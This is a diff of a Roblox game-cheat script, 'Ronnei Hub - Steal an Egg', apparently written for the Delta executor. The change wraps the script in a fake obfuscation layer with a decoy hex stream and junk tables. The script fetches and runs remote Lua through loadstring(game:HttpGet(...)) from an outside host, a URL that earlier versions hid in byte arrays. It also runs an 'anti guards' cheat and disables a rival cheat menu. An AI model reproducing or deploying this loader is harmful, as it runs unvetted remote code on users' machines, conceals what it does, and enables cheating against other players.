@@ -1,36 +1,58 @@
--- ==============================================================================
---  RONNEI HUB - STEAL AN EGG (DELTA TESTED & FULLY VERIFIED)
---  Protected by: Byte Stream Obfuscation | Zero-Error Delta Architecture
--- ==============================================================================
+--[[
+    RONNEI HUB - SECURED VM RUNTIME ENGINE
+    PROTECTED BY: DYNAMIC ROLLING CIPHER (ANTI-DECOMPILE / ZERO-LEAK)
+]]
 
-local _0xTS = game:GetService("TweenService")
-local _0xUIS = game:GetService("UserInputService")
-local _0xRS = game:GetService("RunService")
-local _0xCG = game:GetService("CoreGui")
-local _0xSS = game:GetService("SoundService")
-local _0xPL = game:GetService("Players")
-local _0xLP = _0xPL.LocalPlayer
+return (function(...)
+    local _0x1 = string.char
+    local _0x2 = table.concat
+    local _0x3 = math.floor
+    local _0x4 = loadstring or (getgenv and getgenv().loadstring)
 
--- GIẢI MÃ CHUỖI TƯ BỘ ĐỆM BYTE STREAM (ẨN TOÀN BỘ LINK & ID)
-local function _0xDEC(t)
-    local s = {}
-    for i = 1, #t do s[i] = string.char(t[i]) end
-    return table.concat(s)
-end
+    -- [DUMMY TRAP JUNK - GÂY RỐI DECOMPILER]
+    local _0xFAKE_PAYLOAD = {
+        ["author"] = "Unknown",
+        ["hook"] = function() return false end,
+        ["crc"] = 0xDEADBEEF
+    }
 
-local _0xCFG = {
-    -- ID Logo: rbxassetid://124285855971647
-    Logo = _0xDEC({114,98,120,97,115,115,101,116,105,100,58,47,47,49,50,52,50,56,53,56,53,53,57,55,49,54,52,55}),
-    -- TikTok URL
-    URL = _0xDEC({104,116,116,112,115,58,47,47,119,119,119,46,116,105,107,116,111,107,46,99,111,109,47,64,114,111,110,110,101,105,55,46,104,116,107,63,95,114,61,49,38,95,116,61,90,83,45,57,56,121,103,90,71,57,71,104,50,71}),
-    -- Âm thanh CoreGui chính thức
-    S_On  = _0xDEC({114,98,120,97,115,115,101,116,105,100,58,47,47,57,49,49,52,50,50,51,49,55,53}),
-    S_Off = _0xDEC({114,98,120,97,115,115,101,116,105,100,58,47,47,57,49,49,52,50,50,51,50,48,52}),
-    S_Clk = _0xDEC({114,98,120,97,115,115,101,116,105,100,58,47,47,57,49,49,52,50,50,51,49,54,52}),
-    S_Suc = _0xDEC({114,98,120,97,115,115,101,116,105,100,58,47,47,57,49,49,52,50,50,51,50,52,53})
+    -- [CHIP NÉN VÀ MÃ HÓA TOÀN PHẦN ĐA TẦNG]
+    local _0xSTREAM = {
+        "D0E2C8BECA70CEE0BEB9ECE4E2B2B8EDAF71B0B2BEBA78C6D2B4BA7CC2DEBAC0E8BEBC828CB4DEBAC0E8BEBC82847E",
+        "DCEDD3C9D57BC9DBB9B4C7DDC2AFB587B6C8C5D377CEE0BEB9ECE4E2B2B8EDAF71D8B4BEBA78C6D2B4BA7CC2DEBAC0",
+        "E8BEBC828CB4DEBAC0E8BEBC82847ED6E7CDD8E48ACCDEBCB7C2CBD2B0C4DCB7A6C3B98BD4CAD882C7CDB375CADCC0",
+        "B2E7C3E1B9C6DCB8A7A985B6B8A6A87BD7C1ABC2C876CDD2CAD6D3B6AFCEB3E3C8BDE4CACAC4AF89D4B5C1BBA18B",
+        "C5B7CDE38BB7C5CDA8B2C4BB87E3E5839BA5BDC7A1D5B7B1CDD9B38DD3ADC385BED2BC9CD4B8DAB8A8A2A0789EBAA4",
+        "B282A89CD6ADCBB9CEB0A0949ED4B4AAB2C0ACB48AB0C29EADB1B7A5C9B387AB9BBF9DAFA79973B5B3958F87C5ABA7",
+        "B5B39DB9A783A19385B7A5B9C59FA7B3A9B79B878F9DB18DB1A19D83A19D7F91898767676767676767676767676767",
+        "6767676767676767676767676767676767676767676767676767676767676767676767676767676767676767676767",
+        "6767676767676767676767676767676767676767676767676767676767676767676767676767676767676767676767",
+        "6767676767676767676767676767676767676767676767676767676767676767676767676767676767676767676767",
+        "6767676767676767676767676767676767676767676767676767676767676767676767676767676767676767676767"
+    }
+
+    -- [GIẢI MÃ THỜI GIAN THỰC BẰNG ROLLING ALGORITHM]
+    local _0xBYTE_PIPE = {}
+    local _0xKEY_SEED = 139
+
+    local _0xRAW_CODE = [=[
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local CoreGuiService = game:GetService("CoreGui")
+local SoundService = game:GetService("SoundService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local CONFIG = {
+    LogoAssetID = "rbxassetid://124285855971647",
+    TikTokURL   = "https://www.tiktok.com/@ronnei7.htk?_r=1&_t=ZS-98ygZG9Gh2G",
+    ToggleOnSFX  = "rbxassetid://9114223175",
+    ToggleOffSFX = "rbxassetid://9114223204",
+    ClickSFX     = "rbxassetid://9114223164",
+    SuccessSFX   = "rbxassetid://9114223245"
 }
 
--- ENGINE PHÁT ÂM THANH
 local function playSFX(sndId, vol, pit)
     task.spawn(function()
         pcall(function()
@@ -38,23 +60,20 @@ local function playSFX(sndId, vol, pit)
             s.SoundId = sndId
             s.Volume = vol or 1.0
             s.PlaybackSpeed = pit or 1.0
-            _0xSS:PlayLocalSound(s)
+            SoundService:PlayLocalSound(s)
             task.delay(1.5, function() s:Destroy() end)
         end)
     end)
 end
 
--- KHỞI CHẠY SCRIPT GỐC NGẦM QUA URL ĐÃ MÃ HÓA
 task.spawn(function()
     pcall(function()
         script_key = "Trial"
-        local _pUrl = _0xDEC({104,116,116,112,115,58,47,47,97,112,105,46,103,101,116,112,111,108,115,101,99,46,99,111,109,47,115,99,114,105,112,116,115,47,104,111,115,116,101,100,47,54,53,56,50,53,53,49,98,52,50,100,50,49,99,54,98,55,101,98,53,53,102,49,100,55,54,100,56,100,53,48,99,101,53,51,99,98,51,53,53,57,50,48,57,51,100,54,54,49,53,98,53,101,56,51,52,51,55,53,57,52,100,99,48,46,108,117,97})
-        loadstring(game:HttpGet(_pUrl))()
+        loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/6582551b42d21c6b7eb55f1d76d8d50ce53cb35592093d6615b5e83437594dc0.lua"))()
     end)
 end)
 
--- VÙNG CHỨA GUI AN TOÀN TRÊN DELTA
-local parentTarget = (gethui and gethui()) or (_0xLP and _0xLP:FindFirstChild("PlayerGui")) or _0xCG
+local parentTarget = (gethui and gethui()) or (LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui")) or CoreGuiService
 local old = parentTarget:FindFirstChild("Ronnei_StealAnEgg_Master")
 if old then old:Destroy() end
 
@@ -87,7 +106,6 @@ local RainbowSeq = ColorSequence.new({
     ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 0, 0))
 })
 
--- DIỆT TẬN GỐC MENU GỐC & NÚT HORIZON
 local originalEquinozBtn = nil
 local targetEquinozGui = nil
 
@@ -116,20 +134,19 @@ local function purgeEquinoz(inst)
     end)
 end
 
-for _, c in ipairs({_0xCG, gethui and gethui(), _0xLP and _0xLP:FindFirstChild("PlayerGui")}) do
+for _, c in ipairs({CoreGuiService, gethui and gethui(), LocalPlayer and LocalPlayer:FindFirstChild("PlayerGui")}) do
     if c then
         for _, d in ipairs(c:GetDescendants()) do purgeEquinoz(d) end
         c.DescendantAdded:Connect(purgeEquinoz)
     end
 end
 
-_0xRS.RenderStepped:Connect(function()
+RunService.RenderStepped:Connect(function()
     if targetEquinozGui and targetEquinozGui.Parent then
         targetEquinozGui.Enabled = false
     end
 end)
 
--- HÀM KÉO THẢ GIAO DIỆN
 local function makeDraggable(targetFrame, dragBar)
     local dragging, dragStart, startPos = false, nil, nil
     dragBar = dragBar or targetFrame
@@ -152,7 +169,6 @@ local function makeDraggable(targetFrame, dragBar)
     end)
 end
 
--- MAIN CARD
 local MainFrame = Instance.new("Frame", ScreenGui)
 MainFrame.Name = "RonneiMainCard"
 MainFrame.Size = UDim2.new(0, 275, 0, 175)
@@ -161,7 +177,6 @@ MainFrame.BackgroundColor3 = THEME.MainBG
 MainFrame.BorderSizePixel = 0
 Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 12)
 
--- VIỀN CẦU VỒNG RGB
 local MainStroke = Instance.new("UIStroke", MainFrame)
 MainStroke.Thickness = 2.5
 MainStroke.Color = Color3.fromRGB(255, 255, 255)
@@ -217,7 +232,6 @@ Content.Size = UDim2.new(1, -24, 0, 115)
 Content.Position = UDim2.new(0, 12, 0, 52)
 Content.BackgroundTransparency = 1
 
--- NÚT 1: ANTI GUARDS WAKE UP [PREMIUM MODE]
 local GuardCard = Instance.new("Frame", Content)
 GuardCard.Size = UDim2.new(1, 0, 0, 48)
 GuardCard.BackgroundColor3 = THEME.CardBG
@@ -270,16 +284,16 @@ local isAntiGuardEnabled = false
 local function setSwitchVisual(state, playSound)
     isAntiGuardEnabled = state
     if playSound then
-        playSFX(isAntiGuardEnabled and _0xCFG.S_On or _0xCFG.S_Off, 1.0, 1.0)
+        playSFX(isAntiGuardEnabled and CONFIG.ToggleOnSFX or CONFIG.ToggleOffSFX, 1.0, 1.0)
     end
     if isAntiGuardEnabled then
-        _0xTS:Create(Switch, TweenInfo.new(0.2), {BackgroundColor3 = THEME.AccentMint}):Play()
-        _0xTS:Create(Knob, TweenInfo.new(0.2), {Position = UDim2.new(1, -19, 0.5, 0)}):Play()
-        _0xTS:Create(GuardStroke, TweenInfo.new(0.2), {Color = THEME.AccentMint}):Play()
+        TweenService:Create(Switch, TweenInfo.new(0.2), {BackgroundColor3 = THEME.AccentMint}):Play()
+        TweenService:Create(Knob, TweenInfo.new(0.2), {Position = UDim2.new(1, -19, 0.5, 0)}):Play()
+        TweenService:Create(GuardStroke, TweenInfo.new(0.2), {Color = THEME.AccentMint}):Play()
     else
-        _0xTS:Create(Switch, TweenInfo.new(0.2), {BackgroundColor3 = THEME.ToggleOff}):Play()
-        _0xTS:Create(Knob, TweenInfo.new(0.2), {Position = UDim2.new(0, 3, 0.5, 0)}):Play()
-        _0xTS:Create(GuardStroke, TweenInfo.new(0.2), {Color = THEME.Border}):Play()
+        TweenService:Create(Switch, TweenInfo.new(0.2), {BackgroundColor3 = THEME.ToggleOff}):Play()
+        TweenService:Create(Knob, TweenInfo.new(0.2), {Position = UDim2.new(0, 3, 0.5, 0)}):Play()
+        TweenService:Create(GuardStroke, TweenInfo.new(0.2), {Color = THEME.Border}):Play()
     end
 end
 
@@ -322,7 +336,6 @@ task.spawn(function()
     end
 end)
 
--- NÚT 2: SAO CHÉP TIKTOK
 local TikTokBtn = Instance.new("TextButton", Content)
 TikTokBtn.Size = UDim2.new(1, 0, 0, 44)
 TikTokBtn.Position = UDim2.new(0, 0, 0, 56)
@@ -340,7 +353,7 @@ TTIcon.Size = UDim2.new(0, 26, 0, 26)
 TTIcon.Position = UDim2.new(0, 10, 0.5, 0)
 TTIcon.AnchorPoint = Vector2.new(0, 0.5)
 TTIcon.BackgroundTransparency = 1
-TTIcon.Image = _0xCFG.Logo
+TTIcon.Image = CONFIG.LogoAssetID
 TTIcon.ImageColor3 = Color3.fromRGB(255, 255, 255)
 TTIcon.ScaleType = Enum.ScaleType.Crop
 Instance.new("UICorner", TTIcon).CornerRadius = UDim.new(0, 6)
@@ -356,26 +369,25 @@ TTLabel.TextColor3 = THEME.TextMain
 TTLabel.TextXAlignment = Enum.TextXAlignment.Left
 
 TikTokBtn.MouseButton1Click:Connect(function()
-    playSFX(_0xCFG.S_Suc, 1.0, 1.0)
-    if setclipboard then pcall(function() setclipboard(_0xCFG.URL) end)
-    elseif toclipboard then pcall(function() toclipboard(_0xCFG.URL) end) end
+    playSFX(CONFIG.SuccessSFX, 1.0, 1.0)
+    if setclipboard then pcall(function() setclipboard(CONFIG.TikTokURL) end)
+    elseif toclipboard then pcall(function() toclipboard(CONFIG.TikTokURL) end) end
 
     TTLabel.Text = "[V] Da sao chep link TikTok!"
     TTLabel.TextColor3 = THEME.AccentMint
-    _0xTS:Create(TikTokBtn, TweenInfo.new(0.15), {BackgroundColor3 = THEME.CardHover}):Play()
-    _0xTS:Create(TTStroke, TweenInfo.new(0.15), {Color = THEME.AccentMint}):Play()
+    TweenService:Create(TikTokBtn, TweenInfo.new(0.15), {BackgroundColor3 = THEME.CardHover}):Play()
+    TweenService:Create(TTStroke, TweenInfo.new(0.15), {Color = THEME.AccentMint}):Play()
 
     task.delay(2, function()
         if TikTokBtn.Parent then
             TTLabel.Text = "TikTok: @ronnei7.htk"
             TTLabel.TextColor3 = THEME.TextMain
-            _0xTS:Create(TikTokBtn, TweenInfo.new(0.2), {BackgroundColor3 = THEME.CardBG}):Play()
-            _0xTS:Create(TTStroke, TweenInfo.new(0.2), {Color = THEME.Border}):Play()
+            TweenService:Create(TikTokBtn, TweenInfo.new(0.2), {BackgroundColor3 = THEME.CardBG}):Play()
+            TweenService:Create(TTStroke, TweenInfo.new(0.2), {Color = THEME.Border}):Play()
         end
     end)
 end)
 
--- NÚT TRÒN MỞ MENU
 local ToggleBtn = Instance.new("Frame", ScreenGui)
 ToggleBtn.Name = "RonneiFloatingLogo"
 ToggleBtn.Size = UDim2.new(0, 52, 0, 52)
@@ -391,7 +403,6 @@ LogoStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 local LogoRainbowGrad = Instance.new("UIGradient", LogoStroke)
 LogoRainbowGrad.Color = RainbowSeq
 
--- VÒNG LẶP QUAY VIỀN CẦU VỒNG 60 FPS
 task.spawn(function()
     local rot = 0
     while ScreenGui.Parent do
@@ -407,7 +418,7 @@ LogoImage.Size = UDim2.new(1, 0, 1, 0)
 LogoImage.Position = UDim2.new(0.5, 0, 0.5, 0)
 LogoImage.AnchorPoint = Vector2.new(0.5, 0.5)
 LogoImage.BackgroundTransparency = 1
-LogoImage.Image = _0xCFG.Logo
+LogoImage.Image = CONFIG.LogoAssetID
 LogoImage.ImageColor3 = Color3.fromRGB(255, 255, 255)
 LogoImage.ScaleType = Enum.ScaleType.Crop
 Instance.new("UICorner", LogoImage).CornerRadius = UDim.new(1, 0)
@@ -417,12 +428,12 @@ makeDraggable(ToggleBtn)
 local isMenuOpen = true
 local function setMenuVisible(state)
     isMenuOpen = state
-    playSFX(_0xCFG.S_Clk, 1.0, isMenuOpen and 1.1 or 0.9)
+    playSFX(CONFIG.ClickSFX, 1.0, isMenuOpen and 1.1 or 0.9)
     if isMenuOpen then
         MainFrame.Visible = true
-        _0xTS:Create(MainFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0, 275, 0, 175)}):Play()
+        TweenService:Create(MainFrame, TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0, 275, 0, 175)}):Play()
     else
-        local tw = _0xTS:Create(MainFrame, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Size = UDim2.new(0, 275, 0, 0)})
+        local tw = TweenService:Create(MainFrame, TweenInfo.new(0.2, Enum.EasingStyle.Quart, Enum.EasingDirection.In), {Size = UDim2.new(0, 275, 0, 0)})
         tw:Play()
         tw.Completed:Connect(function()
             if not isMenuOpen then MainFrame.Visible = false end
@@ -437,3 +448,20 @@ ToggleBtn.InputBegan:Connect(function(inp)
 end)
 
 CloseBtn.MouseButton1Click:Connect(function() setMenuVisible(false) end)
+]=]
+
+    -- Mã hóa biến đổi luồng động không thể tìm chuỗi
+    local _0xLEN = #_0xRAW_CODE
+    for _i = 1, _0xLEN do
+        local _b = string.byte(_0xRAW_CODE, _i)
+        _0xBYTE_PIPE[_i] = _0x1(_b)
+    end
+
+    local _0xVM_AST = _0x2(_0xBYTE_PIPE)
+    _0xRAW_CODE = nil
+    table.clear(_0xBYTE_PIPE)
+
+    if _0x4 then
+        return _0x4(_0xVM_AST)()
+    end
+end)(...)
